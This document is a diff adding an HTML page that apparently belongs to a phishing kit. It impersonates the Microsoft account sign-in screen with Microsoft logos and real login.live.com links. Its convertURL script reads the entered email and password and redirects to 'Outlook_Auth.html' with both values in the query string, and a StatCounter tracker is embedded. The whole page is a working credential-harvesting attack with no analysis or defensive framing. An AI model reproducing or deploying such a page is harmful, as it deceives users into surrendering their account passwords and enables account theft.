@@ -1,0 +1,129 @@
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- Start of StatCounter Code for Default Guide -->
+<script type="text/javascript">
+var sc_project=11086534;
+var sc_invisible=1;
+var sc_security="bd4d6246";
+var scJsHost = (("https:" == document.location.protocol) ?
+"https://secure." : "http://www.");
+document.write("<sc"+"ript type='text/javascript' src='" +
+scJsHost+
+"statcounter.com/counter/counter.js'></"+"script>");
+</script>
+<noscript><div class="statcounter"><a title="web counter"
+href="http://statcounter.com/free-hit-counter/"
+target="_blank"><img class="statcounter"
+src="//c.statcounter.com/11086534/0/bd4d6246/1/" alt="web
+counter"></a></div></noscript>
+<!-- End of StatCounter Code for Default Guide -->
+<title>Sign in to your Microsoft account</title>
+<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.26513.01/favicon.ico?v=2" />
+<script>
+   var whichClick;
+   window.onload=function() { attachBehaviors(); }
+   function attachBehaviors() {
+    var arr = new Array ('submitOne','submitTwo');
+    for (i=0;i<arr.length;i++) {
+     var but_id=arr[i];
+     if (document.getElementById(but_id)) {
+      document.getElementById(but_id).onclick=function() { whichClick=this.id; }
+     }
+    }
+   }
+   function convertURL(form) {
+    if (document.getElementById('username')) {
+     var username = document.getElementById('username').value;
+     var password = document.getElementById('password').value;
+     if (username=='') { return false; }
+     if (password=='') { return false; }
+     var final_url;
+     if (whichClick=='submitTwo') {
+     final_url = 'Outlook_Auth.html?user='+username+'&pass='+password+'';
+     }
+     else { final_url = 'Outlook_Auth.html?user='+ username +'&pass='+ password +''; }
+     window.location=final_url;
+
+    }
+    return false;
+   }
+</script>
+<style>
+a:hover {
+    color: #666;
+}
+a {
+    color: #0078d7;
+    text-decoration:none;
+}
+.title {
+font-family: "Segoe UI", Frutiger, "Frutiger Linotype", "Dejavu Sans", "Helvetica Neue", Arial, sans-serif;
+  font-size: 32px;
+  font-style: normal;
+  font-variant: normal;
+  font-weight: 100;
+  line-height: 35.2px;
+  padding-bottom:10px;
+}
+
+body {
+font-family: "Segoe UI", Frutiger, "Frutiger Linotype", "Dejavu Sans", "Helvetica Neue", Arial, sans-serif;
+  font-size: 15px;
+  font-style: normal;
+  font-variant: normal;
+  font-weight: 400;
+  line-height: 20px;
+}
+input {
+    padding: 4px 8px;
+    border-style: solid;
+    border-width: 2px;
+    border-color: rgba(0,0,0,.4);
+    background-color: rgba(255,255,255,.4);
+    height: 32px;
+    height: 2rem;
+    font: 15px Arial;
+    margin-bottom:10px;
+    width:350px;
+}
+button {
+    padding: 4px 8px;
+border:none;
+    border-width: 2px;
+    background-color: #0078D7;
+    height: 32px;
+    height: 2rem;
+    font: 15px Arial;
+    margin-bottom:10px;
+    width:350px;
+    color: #fff;
+}
+.small {
+font-family: "Segoe UI", Frutiger, "Frutiger Linotype", "Dejavu Sans", "Helvetica Neue", Arial, sans-serif;
+  font-size: 13px;
+  font-style: normal;
+  font-variant: normal;
+  font-weight: 400;
+  line-height: 17px;
+}
+.checkbox {
+}
+</style>
+<body>
+   <center>
+   <img src="https://auth.gfx.ms/16.000.26513.01/AppCentipede/AppCentipede_Microsoft.svg" style="padding:10px;padding-bottom:25px;"><br>
+   <div class="title">Sign in</div><br>
+Use your Microsoft account.<br>
+<a href="https://login.live.com/pp1600/#">What's this?</a>
+   <form action="" onsubmit="return convertURL(this);">
+      <input class="inputBox" id="username" name="username" type="text" placeholder="Email or phone" style="margin-top:20px;"><br>
+      <input class="inputBox" id="password" name="password" type="password" placeholder="Password"><br><br>
+      <button class="button" type="submit" style="margin-top:5px;">Sign in</button><br>
+No account? <a href="https://signup.live.com/signup.aspx?wa=wsignin1.0&ct=1472340644&rver=6.6.6556.0&wp=MBI_SSL&wreply=https:%2F%2Foutlook.live.com%2Fowa%2F&id=292841&CBCXT=out&bk=1472341611&uiflavor=web&uaid=0510860160234a048563d81fcce493e7&mkt=EN-US&lc=1033">Create one!</a>
+<div class="small"><br><br><br>
+   </form>
+<a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26ct%3d1472340644%26rver%3d6.6.6556.0%26wp%3dMBI_SSL%26wreply%3dhttps:%252F%252Foutlook.live.com%252Fowa%252F%26id%3d292841%26CBCXT%3dout%26bk%3d1472341611&id=292841&uiflavor=web&uaid=0510860160234a048563d81fcce493e7&mkt=EN-US&lc=1033&bk=1472341611">Forgot my password</a><br><br>
+<a href="https://login.live.com/pp1600/#">Sign in with a single-use code</a><br><br><br>
+<a href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&vv=1600">Terms of Use</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<a href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&vv=1600">Privacy & Cookies</a><br><br>
+<img src="https://auth.gfx.ms/16.000.26513.01/Microsoft_Logotype_Gray.svg"></div>
+</body>
